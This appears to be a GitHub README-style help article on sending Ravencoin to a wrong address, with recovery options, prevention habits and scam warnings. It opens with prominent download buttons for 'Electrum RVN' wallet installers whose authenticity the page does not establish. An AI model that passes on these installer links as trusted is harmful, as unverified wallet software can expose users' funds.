![Electrum RVN](assets/banner-article.png)

# Sent RVN to the Wrong Address?

<!-- compact-download-block -->

<p align="center">Why the check happens before confirming</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
A send to the wrong address, or to an address on the wrong network, is usually final. There is no reversal, no chargeback and no support desk that can pull a transaction back. What you can do depends entirely on which kind of wrong it was - and the process fix, checking the network before sending, is worth more than any recovery hope.

## The four kinds of wrong

| What happened | Recoverable? |
| --- | --- |
| Typo in an `R` address | almost never - the checksum usually prevents the send |
| Valid address, wrong recipient | no - the recipient controls it |
| Sent to an `0x` address on another chain | no - it is not on this chain at all |
| Sent on testnet, expected mainnet | no - different network, different coins |

The first row is the good news: base58 addresses carry a checksum, so a single mistyped character is usually rejected before anything is broadcast. The wallet refusing an address is the system working.

## Why a valid address is still a risk

Validation checks the format, not the owner. A perfectly formed `R` address belonging to a stranger passes every test. So the second check is human: compare the first four and last four characters against the source you trust, and treat an address that changed between the message and your clipboard as theft rather than error.

Clipboard-swapping malware does exactly that: it watches for something that looks like an address and replaces it with the attacker's. The character check is the only defence that costs nothing.

## What you can actually do

**If the recipient is a person you know:** ask them. If the address belongs to a wallet they control, they can send it back. That is the only real recovery path, and it depends on their goodwill.

**If the recipient is a service:** open a support ticket with the transaction ID. Some services can credit an internal deposit made to a wrong-but-theirs address. None can retrieve funds sent to an address they do not control.

**If it went to another network:** contact the receiving service and be precise about the network. Whether anything can be done depends on them and on whether the receiving address belongs to them. Do not pay anyone who offers to "recover" it.

**If it never left:** check the transaction on an explorer. A transaction that no explorer can find was not broadcast, and the funds are still in your wallet.

## The wrong-network case, precisely

An `0x` address is an Ethereum-style address on another chain. Real RVN sent to it is not "stuck" - it is a transaction on a network that has no relationship to Ravencoin's, and this wallet has no way to read it.

The mirror image is also common: an exchange withdraws "RVN" as a wrapped token on another chain, and the wallet receives nothing because the token is not the coin. The ticker matching is not the test; the network is - [Ravencoin address format in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/ravencoin-address-format-in-electrum-rvn.md).

Nothing in this wallet reverses either direction. That is a property of blockchains, not a missing feature.

## The process that prevents it

Four habits, in order of how much they save:

1. **Copy, never retype**, and read the first four and last four characters after pasting.
2. **Send a small test first** when the address is new or the amount matters.
3. **Confirm the network name** on any exchange withdrawal screen before submitting.
4. **Never accept an address from an unsolicited message**, however official it looks.

The third is the one that catches people who are careful about the first two: a correct copy of an address on the wrong network is still a loss.

## If you are the recipient of a mistaken send

Someone else's error is your decision. Returning funds is the decent default, and it is not always straightforward - the sender may ask you to send to an address, and that address may itself be wrong.

Practical approach: reply from a channel they already use, confirm the transaction ID and amount, and send to an address they provide in writing. Never ask for a seed or a private key, and never accept a "refund fee" arrangement from a stranger who claims to have sent you money by mistake - that pattern is a scam in its own right.

## What not to do

**Do not send a "recovery fee"** to anyone promising to retrieve funds.

**Do not share your seed** with a service that claims it can reverse a transaction. No service can, and that request is the theft.

**Do not delete the transaction** from your records. If a recovery is ever possible, the ID is what makes it possible.

**Do not assume a stuck transaction is a lost one** - [stuck Ravencoin transaction in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/stuck-ravencoin-transaction-in-electrum-rvn.md).

For sending correctly in the first place, [sending Ravencoin from Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/sending-ravencoin-from-electrum-rvn.md) is the procedure, and [find your Electrum RVN wallet address](https://github.com/electrum-source/download-and-setup/blob/main/find-your-electrum-rvn-wallet-address.md) covers the receiving side. [Electrum RVN will not connect to a server](https://github.com/electrum-source/token-and-network/blob/main/electrum-rvn-will-not-connect-to-a-server.md) is the unrelated failure that looks like a missing payment.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. [Ravencoin fee estimation in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/ravencoin-fee-estimation-in-electrum-rvn.md) is about the part of a send you can control, and [transferring Ravencoin assets with Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/transferring-ravencoin-assets-with-electrum-rvn.md) is the asset version of the same caution - an asset sent to a wallet that ignores assets confirms and vanishes from view.

## FAQ

### Can I reverse a Ravencoin transaction?

No. A confirmed transaction is final, and no one - including the developers - can reverse it.

### I sent RVN to an Ethereum address - can it be recovered?

Almost certainly not. It is a transaction on another network, and this wallet has no way to read or reverse it.

### The address was wrong but valid - what now?

Ask the recipient. If they control the address, only they can return the funds, and only voluntarily.

### Does the wallet warn me about a bad address?

It validates the format and refuses addresses that fail the checksum. It cannot know who owns a valid address, which is why the visual check matters.

### What if the transaction is still unconfirmed?

Then it has not reached the recipient's spendable balance, and a fee bump may still be possible - but the destination is already fixed.

<!-- related-articles -->

## Related articles

- [Ravencoin Address Format in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/ravencoin-address-format-in-electrum-rvn.md)
- [Stuck Ravencoin Transaction in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/stuck-ravencoin-transaction-in-electrum-rvn.md)
- [Sending Ravencoin From Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/sending-ravencoin-from-electrum-rvn.md)
- [How to Find Your Electrum RVN Wallet Address](https://github.com/electrum-source/download-and-setup/blob/main/find-your-electrum-rvn-wallet-address.md)
